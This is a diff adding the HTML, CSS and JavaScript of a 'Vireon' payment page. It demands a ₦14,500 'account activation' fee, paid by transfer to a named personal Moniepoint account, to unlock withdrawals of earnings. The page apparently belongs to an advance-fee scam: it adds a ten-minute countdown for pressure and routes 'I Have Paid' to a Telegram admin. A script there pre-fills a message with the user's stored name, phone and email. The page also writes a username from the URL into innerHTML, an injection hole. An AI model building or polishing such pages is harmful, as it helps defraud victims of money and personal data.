@@ -1,0 +1,1011 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="format-detection" content="telephone=no">
+    <title>Payment - Vireon</title>
+    
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Bricolage+Grotesque:opsz,wght@12..96,300..800&family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/remixicon/4.2.0/remixicon.min.css">
+    <script src="vitecss/js/alpine.min.js"></script>
+    <script src="vitecss/js/app.js"></script>
+    <link rel="stylesheet" href="vitecss/css/app.css">
+    <style>
+        :root {
+            --vireon-cyan: #00f2ff;
+            --vireon-navy: #0a192f;
+            --vireon-glow: rgba(0, 242, 255, 0.5);
+            --bg-body: #0a192f;
+            --bg-card: rgba(10, 25, 47, 0.85);
+            --text-main: #ffffff;
+            --text-muted: rgba(255,255,255,0.6);
+            --glass-bg: rgba(10, 25, 47, 0.75);
+            --glass-border: rgba(0, 242, 255, 0.08);
+            --accent-cyan: #00f2ff;
+            --accent-dark-cyan: #00b8c4;
+            --shadow-sm: 0 4px 6px rgba(0,0,0,0.3);
+            --radius-md: 12px;
+            --radius-lg: 24px;
+            --font-heading: 'Bricolage Grotesque', 'Inter', sans-serif;
+            --font-body: 'Inter', sans-serif;
+            --warning-amber: #ffb703;
+        }
+        [data-theme="light"] {
+            --bg-body: #0a192f;
+            --bg-card: rgba(255,255,255,0.08);
+            --text-main: #ffffff;
+            --text-muted: rgba(255,255,255,0.6);
+            --glass-bg: rgba(10, 25, 47, 0.75);
+            --glass-border: rgba(0, 242, 255, 0.08);
+        }
+
+        * { 
+            margin: 0; 
+            padding: 0; 
+            box-sizing: border-box; 
+        }
+        
+        body {
+            background: linear-gradient(180deg, #000 0%, rgba(0,0,0,0.4) 26%, #000 100%),
+                        #0a192f center/cover no-repeat;
+            color: var(--text-main);
+            font-family: var(--font-body);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            position: relative; 
+            overflow-x: hidden;
+            transition: background-color 0.3s ease, color 0.3s ease;
+            background-attachment: fixed;
+        }
+        body::after {
+            content: '';
+            position: fixed;
+            inset: 0;
+            background-image: 
+                linear-gradient(rgba(255,255,255,0.02) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(255,255,255,0.02) 1px, transparent 1px);
+            background-size: 60px 60px;
+            pointer-events: none;
+            z-index: 0;
+        }
+        body::before {
+            content: '';
+            position: fixed;
+            inset: 0;
+            background: 
+                radial-gradient(ellipse at 70% 20%, rgba(0, 242, 255, 0.08) 0%, transparent 50%),
+                radial-gradient(ellipse at 30% 80%, rgba(0, 242, 255, 0.04) 0%, transparent 50%);
+            pointer-events: none;
+            animation: glowPulse 8s ease-in-out infinite alternate;
+            z-index: 0;
+        }
+
+        @keyframes glowPulse {
+            0% { opacity: 0.6; }
+            100% { opacity: 1; }
+        }
+        .page-header {
+            display: flex; 
+            justify-content: space-between; 
+            align-items: center;
+            padding: 16px 24px;
+            background: rgba(10, 25, 47, 0.7);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            border-bottom: 1px solid var(--glass-border);
+            position: sticky; 
+            top: 0; 
+            z-index: 100;
+            transition: background 0.3s, border-color 0.3s;
+            height: 70px;
+        }
+
+        .header-left { 
+            display: flex; 
+            align-items: center; 
+            gap: 20px; 
+        }
+        
+        .back-btn { 
+            color: var(--text-main); 
+            text-decoration: none; 
+            font-size: 1.2rem; 
+            width: 40px; 
+            height: 40px; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center;
+            background: rgba(255,255,255,0.06); 
+            border-radius: 50%; 
+            transition: 0.2s; 
+            flex-shrink: 0;
+        }
+        .back-btn:hover { 
+            color: var(--accent-cyan); 
+            transform: translateX(-3px);
+            background: rgba(0, 242, 255, 0.1);
+        }
+        .brand-logo {
+            height: 32px;
+            width: auto;
+            object-fit: contain;
+            display: block;
+            filter: drop-shadow(0 2px 8px rgba(0,0,0,0.3));
+        }
+        .logo-text {
+            font-family: var(--font-heading);
+            font-weight: 900;
+            font-size: 1.6rem;
+            color: var(--accent-cyan);
+            letter-spacing: -0.04em;
+            text-decoration: none;
+            text-shadow: 0 0 30px rgba(0, 242, 255, 0.15);
+        }
+        .logo-text span {
+            color: #fff;
+        }
+        .theme-toggle {
+            background: rgba(255,255,255,0.06); 
+            border: 1px solid var(--glass-border);
+            width: 40px; 
+            height: 40px; 
+            border-radius: 50%; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center;
+            cursor: pointer; 
+            color: var(--text-main); 
+            transition: 0.2s; 
+            flex-shrink: 0;
+        }
+        .theme-toggle:hover { 
+            color: var(--accent-cyan); 
+            border-color: var(--accent-cyan);
+            background: rgba(0, 242, 255, 0.1);
+        }
+        .main-wrapper {
+            flex: 1; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            padding: 40px 20px 80px 20px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .activation-container {
+            width: 100%; 
+            max-width: 500px; 
+            background: rgba(10, 25, 47, 0.6);
+            backdrop-filter: blur(20px); 
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(0, 242, 255, 0.08);
+            border-radius: var(--radius-lg); 
+            padding: 40px 30px; 
+            box-shadow: 0 20px 60px rgba(0,0,0,0.4);
+            animation: fadeUp 0.6s ease-out;
+            position: relative;
+            overflow: hidden;
+        }
+
+        @keyframes fadeUp { 
+            from { opacity: 0; transform: translateY(20px); } 
+            to { opacity: 1; transform: translateY(0); } 
+        }
+
+        .header-text { 
+            text-align: center; 
+            margin-bottom: 25px; 
+        }
+        .header-text h2 { 
+            font-family: var(--font-heading); 
+            font-size: 1.8rem; 
+            font-weight: 800; 
+            color: var(--text-main); 
+            margin-bottom: 10px; 
+            line-height: 1.2;
+            letter-spacing: -0.02em;
+        }
+        .header-text h2 .cyan {
+            background: linear-gradient(135deg, var(--accent-cyan), #7af0ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            background-clip: text;
+        }
+        .header-text p { 
+            color: var(--text-muted); 
+            font-size: 0.95rem; 
+            line-height: 1.6; 
+        }
+
+        /* ===== TIMER CONTAINER ===== */
+        .timer-box {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            padding: 8px 16px;
+            border-radius: 50px;
+            width: fit-content;
+            margin: 0 auto 20px auto;
+            color: var(--text-muted);
+            font-size: 0.85rem;
+            font-weight: 500;
+        }
+        .timer-box i {
+            color: var(--accent-cyan);
+            font-size: 1rem;
+        }
+        .timer-box span {
+            font-family: var(--font-heading);
+            font-weight: 700;
+            color: #fff;
+            letter-spacing: 0.5px;
+        }
+
+        .amount-display { 
+            background: rgba(0, 242, 255, 0.06); 
+            border: 1px solid rgba(0, 242, 255, 0.12); 
+            padding: 20px 25px; 
+            border-radius: var(--radius-md); 
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px; 
+        }
+        .amount-details {
+            text-align: left;
+        }
+        .amount-label { 
+            font-size: 0.8rem; 
+            text-transform: uppercase; 
+            letter-spacing: 1px; 
+            color: var(--text-muted); 
+            font-weight: 600; 
+            margin-bottom: 2px; 
+        }
+        .amount-value { 
+            font-family: var(--font-heading); 
+            font-size: 2.2rem; 
+            font-weight: 800; 
+            color: var(--accent-cyan); 
+            display: flex; 
+            align-items: center; 
+            gap: 3px; 
+            text-shadow: 0 0 30px rgba(0, 242, 255, 0.15);
+        }
+        .currency { 
+            font-size: 1.4rem; 
+            opacity: 0.7; 
+            color: var(--text-muted);
+        }
+
+        /* ===== WARNING BOX ===== */
+        .warning-card {
+            background: rgba(255, 183, 3, 0.06);
+            border: 1px solid rgba(255, 183, 3, 0.15);
+            border-radius: var(--radius-md);
+            padding: 15px;
+            margin-bottom: 25px;
+            display: flex;
+            gap: 12px;
+            align-items: flex-start;
+        }
+        .warning-card i {
+            color: var(--warning-amber);
+            font-size: 1.25rem;
+            line-height: 1;
+            margin-top: 2px;
+        }
+        .warning-text h5 {
+            color: #fff;
+            font-size: 0.85rem;
+            font-weight: 700;
+            margin-bottom: 4px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .warning-text p {
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 0.8rem;
+            line-height: 1.5;
+        }
+        .warning-text strong {
+            color: var(--warning-amber);
+        }
+
+        .bank-section-title {
+            font-size: 0.8rem; 
+            color: var(--text-muted); 
+            margin-bottom: 12px; 
+            text-transform: uppercase; 
+            letter-spacing: 1px; 
+            text-align: center; 
+            font-weight: 600;
+        }
+        .bank-card { 
+            background: rgba(255,255,255,0.04); 
+            border: 1px solid var(--glass-border); 
+            border-radius: var(--radius-md); 
+            padding: 20px; 
+            margin-bottom: 12px; 
+            display: flex; 
+            justify-content: space-between; 
+            align-items: center; 
+            transition: 0.3s;
+        }
+        .bank-card:hover { 
+            transform: translateY(-2px); 
+            border-color: var(--accent-cyan);
+            background: rgba(0, 242, 255, 0.04);
+        }
+        
+        .bank-details p { 
+            margin: 0; 
+        }
+        .bank-name { 
+            font-size: 0.75rem; 
+            color: var(--accent-cyan); 
+            text-transform: uppercase; 
+            font-weight: 700; 
+            margin-bottom: 4px; 
+            letter-spacing: 0.5px; 
+        }
+        .acc-number { 
+            font-family: var(--font-heading); 
+            font-size: 1.4rem; 
+            font-weight: 700; 
+            color: var(--text-main); 
+            letter-spacing: 1.5px; 
+            margin-bottom: 4px; 
+        }
+        .acc-name { 
+            font-size: 0.9rem; 
+            color: var(--text-muted); 
+        }
+        
+        .copy-btn { 
+            background: rgba(0, 242, 255, 0.1); 
+            border: 1px solid rgba(0, 242, 255, 0.15); 
+            color: var(--accent-cyan); 
+            width: 42px; 
+            height: 42px; 
+            border-radius: 10px; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            cursor: pointer; 
+            transition: 0.3s; 
+            flex-shrink: 0;
+            font-size: 1.1rem;
+        }
+        .copy-btn:hover { 
+            background: var(--accent-cyan); 
+            color: #0a192f; 
+            border-color: var(--accent-cyan);
+        }
+        .btn-confirm { 
+            display: block; 
+            width: 100%; 
+            text-align: center; 
+            background: linear-gradient(135deg, var(--accent-cyan), #7af0ff);
+            color: #0a192f; 
+            padding: 16px; 
+            border-radius: var(--radius-md); 
+            text-decoration: none; 
+            font-family: var(--font-heading); 
+            font-weight: 800; 
+            font-size: 1rem; 
+            margin-top: 25px; 
+            transition: 0.3s; 
+            border: none;
+            cursor: pointer;
+        }
+        .btn-confirm:hover { 
+            transform: translateY(-2px); 
+            box-shadow: 0 8px 25px rgba(0, 242, 255, 0.35);
+        }
+        .page-footer {
+            text-align: center; 
+            padding: 20px;
+            color: var(--text-muted); 
+            font-size: 0.85rem;
+            border-top: 1px solid var(--glass-border); 
+            background: rgba(10, 25, 47, 0.7);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            position: relative;
+            z-index: 1;
+        }
+        .footer-links { 
+            margin-top: 10px; 
+            display: flex; 
+            justify-content: center; 
+            gap: 20px; 
+        }
+        .footer-links a { 
+            color: var(--text-main); 
+            text-decoration: none; 
+            font-weight: 500; 
+            transition: 0.2s; 
+        }
+        .footer-links a:hover { 
+            color: var(--accent-cyan); 
+        }
+        #toast { 
+            position: fixed; 
+            bottom: 30px; 
+            left: 50%; 
+            transform: translateX(-50%); 
+            background: var(--accent-cyan); 
+            color: #0a192f; 
+            padding: 12px 24px; 
+            border-radius: 50px; 
+            font-weight: 700; 
+            opacity: 0; 
+            visibility: hidden; 
+            transition: 0.3s; 
+            z-index: 1000; 
+            box-shadow: 0 8px 25px rgba(0, 242, 255, 0.3);
+        }
+        #toast.show { 
+            opacity: 1; 
+            visibility: visible; 
+            bottom: 40px; 
+        }
+
+        /* ============================================================
+        POPUP NOTIFICATION OVERLAY & CARD (EXACT MATCH TO ATTACHMENT)
+        ============================================================ */
+        .popup-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(8px);
+            -webkit-backdrop-filter: blur(8px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 2000;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.3s ease, visibility 0.3s ease;
+            padding: 16px;
+        }
+        .popup-overlay.show {
+            opacity: 1;
+            visibility: visible;
+        }
+        .popup-card {
+            background: #ffffff;
+            color: #1e1b4b;
+            width: 100%;
+            max-width: 440px;
+            border-radius: 24px;
+            padding: 28px 24px 24px 24px;
+            position: relative;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+            transform: scale(0.9);
+            transition: transform 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
+            border: 2px solid #ffb703;
+        }
+        .popup-overlay.show .popup-card {
+            transform: scale(1);
+        }
+        .popup-close-btn {
+            position: absolute;
+            top: -12px;
+            right: -12px;
+            width: 32px;
+            height: 32px;
+            background: #ffc107;
+            border: none;
+            border-radius: 50%;
+            color: #1e1b4b;
+            font-size: 1.1rem;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+            z-index: 2010;
+            transition: transform 0.2s;
+        }
+        .popup-close-btn:hover {
+            transform: scale(1.1);
+        }
+        .popup-header {
+            margin-bottom: 16px;
+        }
+        .popup-header h3 {
+            font-family: var(--font-heading);
+            font-size: 1.8rem;
+            font-weight: 800;
+            color: #1a1e36;
+            margin-bottom: 6px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .popup-header p {
+            font-size: 0.88rem;
+            color: #4b5563;
+            line-height: 1.4;
+        }
+        .popup-header p strong {
+            color: #4f46e5;
+            font-weight: 700;
+        }
+
+        /* Banks Grid */
+        .popup-banks-box {
+            border: 1.5px solid #e5e7eb;
+            border-radius: 16px;
+            padding: 18px 12px;
+            background: #f9fafb;
+            margin-bottom: 14px;
+        }
+        .popup-banks-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 12px 24px;
+            align-items: center;
+            justify-items: center;
+        }
+        /* Custom High-Fidelity UI representations for the bank logos */
+        .popup-bank-logo {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 0.9rem;
+            font-weight: 700;
+            color: #111827;
+        }
+        .popup-bank-logo.palmpay i { color: #00b464; }
+        .popup-bank-logo.moniepoint i { color: #0052ff; }
+        .popup-bank-logo.access i { color: #ff5a00; }
+        .popup-bank-logo.kuda i { color: #40196d; }
+        .popup-bank-logo.firstbank i { color: #002c6c; }
+        .popup-bank-logo.fidelity i { color: #0a2540; }
+        
+        .popup-banks-grid .una-bank-row {
+            grid-column: span 2;
+            display: flex;
+            justify-content: center;
+            margin-top: 4px;
+        }
+        .una-bank-text {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            font-weight: 800;
+            color: #00b8c4;
+            font-size: 0.85rem;
+            line-height: 1;
+        }
+        .una-bank-text span {
+            font-size: 0.55rem;
+            letter-spacing: 2px;
+            color: #4b5563;
+        }
+
+        /* Alert Banners */
+        .popup-alert-green {
+            background: #ecfdf5;
+            border: 1px solid #a7f3d0;
+            border-radius: 12px;
+            padding: 10px 12px;
+            display: flex;
+            gap: 10px;
+            align-items: center;
+            margin-bottom: 12px;
+            color: #065f46;
+            font-size: 0.78rem;
+            font-weight: 500;
+            line-height: 1.4;
+        }
+        .popup-alert-green i {
+            font-size: 1.4rem;
+            color: #10b981;
+        }
+        .popup-alert-green strong {
+            color: #047857;
+            font-weight: 700;
+        }
+
+        .popup-alert-red {
+            background: #fef2f2;
+            border: 1px solid #fca5a5;
+            border-radius: 12px;
+            padding: 10px 12px;
+            display: flex;
+            gap: 10px;
+            align-items: center;
+            margin-bottom: 12px;
+            color: #991b1b;
+            font-size: 0.78rem;
+            font-weight: 500;
+            line-height: 1.4;
+        }
+        .popup-alert-red i {
+            font-size: 1.4rem;
+            color: #ef4444;
+        }
+        .popup-alert-red strong {
+            color: #b91c1c;
+            font-weight: 700;
+        }
+
+        .popup-alert-blue {
+            background: #e0e7ff;
+            border: 1px solid #c7d2fe;
+            border-radius: 12px;
+            padding: 10px 12px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 18px;
+            color: #3730a3;
+            font-size: 0.75rem;
+            font-weight: 500;
+        }
+        .popup-alert-blue .left-side {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .popup-alert-blue i {
+            font-size: 1.3rem;
+            color: #4f46e5;
+        }
+
+        .popup-btn-understand {
+            width: 100%;
+            background: linear-gradient(to right, #eab308, #ca8a04);
+            color: #ffffff;
+            border: none;
+            padding: 14px;
+            border-radius: 12px;
+            font-family: var(--font-heading);
+            font-weight: 800;
+            font-size: 0.95rem;
+            cursor: pointer;
+            letter-spacing: 0.5px;
+            transition: 0.2s;
+            box-shadow: 0 4px 10px rgba(202, 138, 4, 0.25);
+        }
+        .popup-btn-understand:hover {
+            transform: translateY(-1px);
+            box-shadow: 0 6px 15px rgba(202, 138, 4, 0.4);
+        }
+
+        @media (max-width: 600px) { 
+            .activation-container { 
+                padding: 30px 20px; 
+            } 
+            .page-header { 
+                padding: 12px 16px; 
+                height: 60px; 
+            }
+            .header-text h2 {
+                font-size: 1.5rem;
+            }
+            .amount-value {
+                font-size: 1.8rem;
+            }
+            .acc-number {
+                font-size: 1.2rem;
+            }
+            .logo-text {
+                font-size: 1.3rem;
+            }
+        }
+
+        @media (max-width: 400px) {
+            .activation-container {
+                padding: 24px 16px;
+            }
+            .bank-card {
+                padding: 16px;
+                flex-wrap: wrap;
+                gap: 10px;
+            }
+            .copy-btn {
+                width: 36px;
+                height: 36px;
+            }
+            .popup-card {
+                padding: 20px 16px 16px 16px;
+            }
+            .popup-banks-grid {
+                gap: 10px 12px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header class="page-header">
+        <div class="header-left">
+            <a href="my-account.html" class="back-btn"><i class="ri-arrow-left-line"></i></a>
+            <img src='logo.png' style='height:30px;margin-right:auto;'>
+        </div>
+        <!-- Theme Toggle -->
+        <button class="theme-toggle" onclick="toggleTheme()" aria-label="Toggle Theme">
+            <i class="ri-moon-line" id="themeIcon"></i>
+        </button>
+    </header>
+    <div class="main-wrapper">
+        
+        <div class="activation-container">
+            
+            <div class="header-text">
+                <h2>Activate <span class="cyan">Account</span></h2>
+                <p>Make the one-time payment below to unlock all features and withdrawals.</p>
+            </div>
+
+            <!-- ===== COUNTDOWN TIMER (Updated to 10 Minutes) ===== -->
+            <div class="timer-box">
+                <i class="ri-time-line"></i> Session expires in: <span id="countdown">10:00</span>
+            </div>
+
+            <!-- ===== AMOUNT DISPLAY WITH FUNCTIONAL COPY ===== -->
+            <div class="amount-display">
+                <div class="amount-details">
+                    <div class="amount-label">Total Due</div>
+                    <div class="amount-value" id="amtValue">
+                        <span class="currency">₦</span>14,500
+                    </div>
+                </div>
+                <button class="copy-btn" onclick="copyText('amtValue', true)" aria-label="Copy Amount">
+                    <i class="ri-file-copy-line"></i>
+                </button>
+            </div>
+
+            <!-- ===== PAYMENT WARNING ===== -->
+            <div class="warning-card">
+                <i class="ri-error-warning-line"></i>
+                <div class="warning-text">
+                    <h5>Important Warning Notice</h5>
+                    <p>Please <strong>DO NOT</strong> transfer funds using <strong>OPAY</strong>. Opay transactions face severe network settlement processing blockages, leading to high validation delays and potential account withdrawal locks.</p>
+                </div>
+            </div>
+
+            <!-- ===== BANK DETAILS ===== -->
+            <div style="margin-bottom: 20px;">
+                <h4 class="bank-section-title">Transfer To:</h4>
+                
+                <div class="bank-card">
+                    <div class="bank-details">
+                        <p class="bank-name">MONIEPOINT MFB</p>
+                        <p class="acc-number" id="acc1">6555650977</p>
+                        <p class="acc-name">CHIDERA E. EMMANUEL - VIREON NETWORK</p>
+                    </div>
+                    <!-- Fixed clean Copy Button matching Amount Display syntax -->
+                    <button class="copy-btn" onclick="copyText('acc1')" aria-label="Copy Account Number">
+                        <i class="ri-file-copy-line"></i>
+                    </button>
+                </div>
+            </div>
+
+            <!-- ===== CONFIRM BUTTON (ID Added for Dynamic Telegram Linking) ===== -->
+            <a id="telegramBtn" href="https://t.me/Vireon_admin1" target="_blank" class="btn-confirm">
+                I Have Paid <i class="ri-arrow-right-line" style="margin-left:8px;"></i>
+            </a>
+
+        </div>
+    </div>
+
+    <!-- ============================================================
+    POPUP NOTIFICATION (POPUP OVERLAY & DIALOG)
+    ============================================================ -->
+    <div class="popup-overlay" id="popupOverlay">
+        <div class="popup-card">
+            <!-- Close Button -->
+            <button class="popup-close-btn" onclick="closePopup()" aria-label="Close notification">
+                <i class="ri-close-line"></i>
+            </button>
+            <!-- Header (Targeted seamlessly via JS) -->
+            <div class="popup-header">
+                <h3 id="welcomeUser">Hello Team! 👋</h3>
+                <p>You can now make your payments using any of the <strong>following banks:</strong></p>
+            </div>
+            <!-- Banks Grid Box -->
+            <div class="popup-banks-box">
+                <div class="popup-banks-grid">
+                    <div class="popup-bank-logo palmpay">
+                        <i class="ri-wallet-3-line"></i> PalmPay
+                    </div>
+                    <div class="popup-bank-logo moniepoint">
+                        <i class="ri-bank-card-line"></i> Moniepoint
+                    </div>
+                    <div class="popup-bank-logo access">
+                        <i class="ri-compass-3-line"></i> Access
+                    </div>
+                    <div class="popup-bank-logo kuda">
+                        <i class="ri-refund-line"></i> Kuda.
+                    </div>
+                    <div class="popup-bank-logo firstbank">
+                        <i class="ri-goblet-line"></i> FirstBank
+                    </div>
+                    <div class="popup-bank-logo fidelity">
+                        <i class="ri-shield-check-line"></i> Fidelity
+                    </div>
+                    <div class="una-bank-row">
+                        <div class="una-bank-text">
+                            una
+                            <span>BANK</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Green Earning Withdrawal Note -->
+            <div class="popup-alert-green">
+                <i class="ri-wallet-line"></i>
+                <div>
+                    You can also withdraw your earnings using <strong>these same accounts</strong> without any issues.
+                </div>
+            </div>
+
+            <!-- Red Warning Note -->
+            <div class="popup-alert-red">
+                <i class="ri-error-warning-line"></i>
+                <div>
+                    <strong>IMPORTANT NOTICE:</strong> Please <strong>DO NOT</strong> make payments with <strong>OPay</strong>, as withdrawals are not supported with it.
+                </div>
+            </div>
+
+            <!-- Blue Checklist Footer -->
+            <div class="popup-alert-blue">
+                <div class="left-side">
+                    <i class="ri-profile-line"></i>
+                    <span>Kindly follow this instruction carefully to avoid any problems.</span>
+                </div>
+                <span>Thank you! 🙏</span>
+            </div>
+
+            <!-- I Understand Button -->
+            <button class="popup-btn-understand" onclick="closePopup()">I Understand</button>
+        </div>
+    </div>
+
+
+    <!-- ============================================================
+    TOAST
+    ============================================================ -->
+    <div id="toast"><i class="ri-check-line"></i> Copied</div>
+
+    <!-- ============================================================
+    JAVASCRIPT
+    ============================================================ -->
+    <script>
+        // ============================================================
+        // POPUP NOTIFICATION INTERACTION & USERNAME SETTER
+        // ============================================================
+        
+        function showPopup() {
+            let currentUsername = "Team";
+            
+            // Try fetching from both keys referenced across the script safely
+            let username = localStorage.getItem('vireon_username') || localStorage.getItem('registeredUsername');
+
+            if (!username) {
+                const urlParams = new URLSearchParams(window.location.search);
+                username = urlParams.get('username');
+            }
+
+            if (username) {
+                currentUsername = username.charAt(0).toUpperCase() + username.slice(1);
+            }
+
+            // Target the correct element ID to prevent bugs
+            const welcomeHeader = document.getElementById('welcomeUser');
+            if (welcomeHeader) {
+                welcomeHeader.innerHTML = `Hello ${currentUsername}! 👋`;
+            }
+            
+            document.getElementById('popupOverlay').classList.add('show');
+        }
+
+        function closePopup() {
+            document.getElementById('popupOverlay').classList.remove('show');
+        }
+
+        // ============================================================
+        // TOGGLE THEME
+        // ============================================================
+        function toggleTheme() {
+            const html = document.documentElement;
+            const icon = document.getElementById('themeIcon');
+            if (html.getAttribute('data-theme') === 'light') {
+                html.setAttribute('data-theme', 'dark');
+                icon.className = 'ri-moon-line';
+            } else {
+                html.setAttribute('data-theme', 'light');
+                icon.className = 'ri-sun-line';
+            }
+        }
+
+        // ============================================================
+        // COPY FUNCTION WITH TEXT SANITIZATION
+        // ============================================================
+        function copyText(elementId, isAmount = false) {
+            let textToCopy = document.getElementById(elementId).innerText;
+            
+            if(isAmount) {
+                textToCopy = textToCopy.replace('₦', '').trim();
+            }
+
+            navigator.clipboard.writeText(textToCopy).then(() => {
+                var toast = document.getElementById("toast");
+                toast.innerHTML = isAmount ? '<i class="ri-check-line"></i> Amount Copied' : '<i class="ri-check-line"></i> Account Number Copied';
+                toast.classList.add("show");
+                setTimeout(function(){ toast.classList.remove("show"); }, 2000);
+            });
+        }
+
+        // ============================================================
+        // COUNTDOWN TIMER INTERACTION
+        // ============================================================
+        function startTimer(durationInSeconds, displayElement) {
+            let timer = durationInSeconds, minutes, seconds;
+            const interval = setInterval(function () {
+                minutes = parseInt(timer / 60, 10);
+                seconds = parseInt(timer % 60, 10);
+
+                minutes = minutes < 10 ? "0" + minutes : minutes;
+                seconds = seconds < 10 ? "0" + seconds : seconds;
+
+                displayElement.textContent = minutes + ":" + seconds;
+
+                if (--timer < 0) {
+                    clearInterval(interval);
+                    displayElement.textContent = "Expired";
+                    displayElement.style.color = "#ef4444";
+                }
+            }, 1000);
+        }
+
+        function setupTelegramLink() {
+            // 1. Pull ALL details out of localStorage safely
+            let username = localStorage.getItem('vireon_username') || localStorage.getItem('registeredUsername') || '[Username]';
+            let fullName = localStorage.getItem('vireon_fullname') || localStorage.getItem('registeredFullname') || '[Full Name]';
+            let phoneNumber = localStorage.getItem('vireon_phone') || localStorage.getItem('registeredPhone') || '[Phone Number]';
+            let emailAddress = localStorage.getItem('vireon_email') || localStorage.getItem('registeredEmail') || '[Email Address]';
+            
+            // 2. Insert variables dynamically into the template string
+            let textMessage = `Hi Vireon Merchant,\n\nI just made my payment of ₦14,500 for my Vireon registration.\n\nPlease find my proof of payment attached.\n\nMy details:\n- Full name: ${fullName}\n- Username: ${username}\n- Phone Number: ${phoneNumber}\n- Email Address: ${emailAddress}\n\nKindly confirm my payment and proceed with my registration.\n\nThank you.`;
+            
+            // 3. Encode the string safely for URLs
+            let encodedText = encodeURIComponent(textMessage);
+            
+            // 4. Update the anchor tag href link attribute
+            const tgBtn = document.getElementById('telegramBtn');
+            if(tgBtn) {
+                tgBtn.href = `https://t.me/Coachyhubee?text=${encodedText}`;
+            }
+        }
+
+        window.onload = function () {
+            // Initialize Dynamic Template Values
+            setupTelegramLink();
+
+            // Trigger the Popup Notification cleanly on page load
+            setTimeout(showPopup, 400);
+
+            const tenMinutes = 60 * 10;
+            const display = document.querySelector('#countdown');
+            startTimer(tenMinutes, display);
+            
+            console.log('💳 Vireon – Payment Page & Popup Loaded Successfully');
+        };
+    </script>
+</body>
+</html>
